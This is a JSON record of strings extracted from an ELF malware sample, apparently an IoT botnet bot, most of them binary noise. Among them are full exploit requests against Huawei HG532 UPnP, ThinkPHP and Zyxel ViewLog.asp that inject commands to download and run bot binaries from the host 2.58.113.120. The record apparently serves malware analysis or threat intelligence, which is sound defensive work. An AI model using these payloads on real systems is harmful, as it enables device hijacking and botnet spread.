{
    "malware_data": [
        {
            "filename": "9baddc1daef234f76768be8624815532ec29f4cb0c405f291aea9f4c25a22bc6.elf",
            "filetype": "7F454C46",
            "filesize": "76KB",
            "hash_sha256": "9baddc1daef234f76768be8624815532ec29f4cb0c405f291aea9f4c25a22bc6",
            "strings": [
                "}$KxB",
                ":})P.",
                "}=HP`",
                " }$KxB",
                "3x8!",
                "Y.8`",
                "9)al",
                "9)P@",
                "9);P",
                "9).p",
                "9)+8",
                "xQ||",
                "siTv",
                "p1Tv",
                "kq||",
                "h9||",
                "oM8~",
                "o=8~",
                "o-8~",
                "4ATc",
                "cu9!",
                ":W{ >",
                "WZ >",
                "{u8`",
                "|Q|`",
                ":}VI.}6J",
                "U) 6|",
                "xU) 6",
                "u-8`",
                ">|cJ",
                ">}(J",
                "}ISxB",
                "UV|k",
                "@.})",
                "}#Kx9)",
                "q.9)",
                "}ZSx",
                "a\"L;a",
                "\"T|}",
                "!\"D;!",
                "}KSx",
                "}KSx}>",
                "}c[xA",
                "[x9)",
                "0U|d",
                " ||{",
                "\"\\8!\"`N",
                ".u8`",
                ".m8`",
                ".e8`",
                "p18`",
                "Ci|d",
                ",%8`",
                "+E|d",
                "*M8`",
                ")u|}",
                "(}?X",
                "Wy8`",
                ",P8c ",
                "&M8`",
                "%-8`",
                "%%8`",
                "{9y,Pa)",
                "5=|}",
                "4!|d",
                "P0})",
                "\\09`",
                "T`X(}iJx|c",
                "|iJxTc",
                ">|cJx",
                "X(}iJx",
                "}@Zx8",
                ">-= ",
                "U) 6",
                "U) 6})",
                " 6})",
                "UK 6",
                "+}= ",
                "U @.U)(4})",
                " }ISxB",
                ">TjF>/",
                "KxTi@.|",
                ":9i!",
                ".})Z",
                "!H9+!T",
                "!H: ",
                ":]8`",
                "9u8`",
                "*E9@",
                "89),`}cJ",
                "|cH.N",
                "89),`|cJ",
                ",`||",
                "!\\||",
                "!`||",
                "!t||",
                "!|||",
                "\"(||",
                "\"4||",
                "\"<||",
                "\"P||",
                "\"\\||",
                "\"p||",
                "i+ H",
                "K+(+",
                "i+ @",
                "o+(8`",
                "f+$A",
                "f+$8",
                "f+$9",
                "}\\Sx",
                "}[Sx9)",
                "/+(|",
                "f+$H",
                "$}+Kx9k",
                "}#KxN",
                ">}(Kx/",
                "W}@@P",
                ";x9@",
                "+x8!",
                "+x9J",
                " }!R",
                "+x9@",
                "i+,H",
                "K+4+",
                "i+,@",
                "i+48",
                "P*} HP9J",
                "}@SxB",
                "i+0A",
                "i+08",
                ">T~F>/",
                "fg|k",
                "j+08",
                "}[Sx8",
                "i+49 ",
                "U `&",
                "U)P*",
                "*+4|",
                "i+0H",
                "}#Kx}e[x8",
                "+x}%KxD",
                "4}#Kx",
                "8c+TN",
                "}`(P",
                "#x9c",
                "QJD.QJ",
                "@,|}",
                "}#Kx8!",
                ":} B",
                "x8c-XH",
                "H81 ",
                " 0})",
                " >})",
                "x8z*",
                "+D|}",
                "8c,8H",
                "P8c*",
                "}*HP",
                "}#XP9)",
                "}CSx",
                " }CSx}e[x",
                "}CSx}e[x",
                "}e[x}CSx",
                "x}$Kx",
                "9)%l",
                "}`XP+",
                ":}iS",
                "}+HPU)",
                ":}#J",
                "akNm",
                "9)09U)",
                "}FSx}i",
                "|`HQ@",
                "$9i%l+",
                ":} :",
                "}iXP",
                "x8c%",
                "++<9E",
                "#x|y",
                "+@8a",
                "=+@H",
                "i+D/",
                "}iXP= ",
                "i+HH",
                ":9)(",
                "}iXP;",
                "+x|v",
                "}}[x",
                "}a[xN",
                "}DSx",
                "#x||",
                "<}@Z",
                "+x|}",
                "}$Kx",
                ":})B",
                "+`= ",
                "d+h|",
                " POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 2.58.113.120 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "2.58.113.120",
                "<!: acam",
                " 18:1 ",
                "0125!8 ",
                "$5''#;&0",
                "509=:",
                "\"=.,\"",
                "'!$$;& ",
                "?;d509=:",
                "efg`a",
                "!'1&",
                ",<8#",
                "&;; ",
                ":217 10t",
                "!8 T",
                "'<188T",
                "1:5681T",
                "'-' 19T",
                "{6=:{6!'-6;,t",
                "nt5$$81 t:; t2;!:0T",
                ":7;&&17 T",
                "{6=:{6!'-6;,t$'T",
                "{6=:{6!'-6;,t?=88tymtT",
                "{$&;7{T",
                "{1,1T",
                "{20T",
                "{95$'T",
                "{$&;7{:1 { 7$T",
                "{' 5 !'T",
                "z5:=91T",
                "{$&;7{:1 {&;! 1T",
                "5''#;&0T",
                "{1 7{&1';8\"z7;:2T",
                ":591'1&\"1&tT",
                "{01\"{#5 7<0;3T",
                "{01\"{9='7{#5 7<0;3T",
                "$662*7!E",
                ";3=:T",
                "1: 1&T",
                "e365`70;9ag:<$ef1=d?2>T",
                ";!&71t",
                ":3=:1t",
                "!1&-T",
                "GET /index.php?s=/index/",
                "hink",
                "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1",
                "Accept-Encoding: gzip, deflate",
                "Accept: /",
                "User-Agent: Uirusu/2.0",
                "POST /cgi-bin/ViewLog.asp HTTP/1.1",
                "Host: 192.168.0.14:80",
                "User-Agent: python-requests/2.20.0",
                "Content-Length: 227",
                "Content-Type: application/x-www-form-urlencoded",
                " /bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh",
                "?/dev/null",
                "S[kA",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".sdata",
                ".sbss",
                ".bss"
            ]
        }
    ]
}